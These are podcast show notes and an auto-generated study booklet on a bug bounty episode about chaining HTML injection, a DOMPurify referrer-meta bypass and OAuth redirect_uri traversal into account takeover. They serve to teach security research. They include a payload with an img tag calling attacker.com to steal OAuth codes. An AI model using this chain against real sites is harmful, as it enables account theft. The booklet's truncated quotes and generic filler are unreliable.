---
title: "A Hacker on Wall Street — JR0ch17 (Jasmin Landry)"
episode: 61
---


# Episode 61 A Hacker on Wall Street — JR0ch17 (Jasmin Landry)

**Guest:** Jasmin Landry (JR0ch17)
**Format:** Show notes with timestamps (feed) — full transcript
**Topics:** Meta tag + DomPurify bug, OAuth methodology, arbitrary ATO, SSTI to RCE

### TL;DR
- Jasmin found a meta tag `<meta name="referrer" content="unsafe-url">` bypasses DomPurify's DOM removal — the tag is stripped from the DOM by DomPurify, but Chrome still respects the referrer policy → OAuth code leak
- This is a Chrome bug filed since 2020, never fixed — enables referrer leakage even with DomPurify sanitization
- OAuth redirect_uri path traversal: redirect OAuth code to any page on the same domain, including a page with HTML injection
- Combined: HTML injection (even with DomPurify) + meta tag referrer override + OAuth redirect_uri path traversal = ATO

### Key Takeaways
- Meta tag referrer policy works even when the `<meta>` element is removed from DOM after creation by sanitizers — Chrome's referrer policy is set on tag creation, not DOM presence
- OAuth redirect_uri validation often allows path traversal — use `https://target.com/evil/path` instead of `https://evil.com` — still same origin, often permitted
- KYC/banking apps are under-hunted because researchers don't want to submit identity documents — massive advantage for those willing
- SSTI to RCE: template injection in server-side templates → OS command execution

### Bugs and Findings

#### Meta Tag + DomPurify + OAuth Redirect_uri Path Traversal → ATO
- **Target/context:** Unnamed web app with DomPurify sanitization and OAuth login
- **Root cause:**
  1. HTML injection in the app (multiple locations) — DomPurify present
  2. DomPurify strips `<meta name="referrer" content="unsafe-url">` from DOM
  3. Chrome still applies the referrer policy because the tag was parsed
  4. OAuth redirect_uri allowed path traversal (any path on same origin)
  5. Combined: redirect OAuth code to HTML injection page → image tag loads with full URL in referrer → attacker captures OAuth code
- **Exploitation steps:**
  1. Create HTML injection on an accessible page
  2. Inject `<meta name="referrer" content="unsafe-url">` + `<img src="https://attacker.com/steal">`
  3. Initiate OAuth flow with redirect_uri pointing to the injection page
  4. Victim authenticates → code sent to injection page → image request sends `Referer: https://target.com/oauth_callback?code=XXXX`
  5. Attacker captures code → exchanges for session → ATO

### Techniques and Primitives
- **Meta Tag Referrer Override for OAuth Leak:** DomPurify strips the meta tag from DOM but Chrome sets the referrer policy before it's removed — one-liner bypass for any DomPurify-sanitized HTML injection
- **OAuth Redirect_uri Path Traversal:** Test `https://target.com/../evil` style traversals — many OAuth implementations only check origin, not path

### Tooling and Resources
- RFC 6819 — OAuth 2.0 Threat Model and Security Considerations
- IETF OAuth Security BCP (draft-ietf-oauth-security-topics)
- Detectify Labs OAuth writeups

### Suggestions and Advices
- **Jasmin:** "I learned by self-teaching — I don't watch videos. I read the Web Application Hacker's Handbook twice, 900 pages. That's how I learned the most."
- Costs of maintaining your own recon tooling often exceed investment — manual hacking + collaboration with data-provider partners is more efficient
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Jasmin found a meta tag `<meta name="referrer" content="unsafe-url">` bypasses DomPurify's DOM removal — the tag is stripped from the DOM by DomPurify, but Chrome still respects the referrer policy → OAuth code leak

#### 2. What you should learn
- Understand **meta tag referrer policy works even when the `<meta>` element is removed from dom after creation by sanitizers — chrome's referrer policy is set on tag creation, not dom presence**
- Understand **oauth redirect_uri validation often allows path traversal — use `https://target.com/evil/path` instead of `https://evil.com` — still same origin, often permitted**
- Understand **kyc/banking apps are under-hunted because researchers don't want to submit identity documents — massive advantage for those willing**
- Understand **ssti to rce: template injection in server-side templates → os command execution**

#### 3. Core concepts explained
**Meta Tag + DomPurify + OAuth Redirect_uri Path Traversal → ATO**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Meta Tag Referrer Override for OAuth Leak: DomPurify strips the meta tag from DOM but Chrome sets the referrer policy before it's removed**
- one-liner bypass for any DomPurify-sanitized HTML injection

**OAuth Redirect_uri Path Traversal: Test `https://target.com/../evil` style traversals**
- many OAuth implementations only check origin, not path


#### 4. Techniques and tactics
**Meta Tag Referrer Override for OAuth Leak: DomPurify strips the meta tag from DOM but Chrome sets the referrer policy before it's removed**
- **What it is:** one-liner bypass for any DomPurify-sanitized HTML injection
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**OAuth Redirect_uri Path Traversal: Test `https://target.com/../evil` style traversals**
- **What it is:** many OAuth implementations only check origin, not path
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Jasmin: "I learned by self-teaching"* — **I don't watch videos. I read the Web Application Hacker's Handbook twice, 900 pages. That's how I learned the most.**
- *"Costs of maintaining your own recon tooling often exceed investment"* — **manual hacking + collaboration with data-provider partners is more efficient**

#### 6. Mental models
- **Jasmin: "I learned by self-teaching — I don't watch videos. ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Costs of maintaining your own recon tooling often exceed inv** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Meta tag referrer policy works even when the `<meta>` element is removed from DOM after creation by sanitizers — Chrome's referrer policy is set on tag creation, not DOM presence
- **Try this:** OAuth redirect_uri validation often allows path traversal — use `https://target.com/evil/path` instead of `https://evil.com` — still same origin, often permitted
- **Try this:** KYC/banking apps are under-hunted because researchers don't want to submit identity documents — massive advantage for those willing
- **Try this:** SSTI to RCE: template injection in server-side templates → OS command execution

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **OAuth** — Open standard for authorization — delegated access without sharing passwords
- **SSTI** — Server-Side Template Injection — injecting template syntax that executes on server

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Meta Tag + DomPurify + OAuth Redirect_uri Path Traversal → ATO?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Jasmin found a meta tag `<meta name="referrer" content="unsafe-url">` bypasses D**
2. **Meta tag referrer policy works even when the `<meta>` element is removed from DO**
3. **OAuth redirect_uri validation often allows path traversal — use `https://target.**
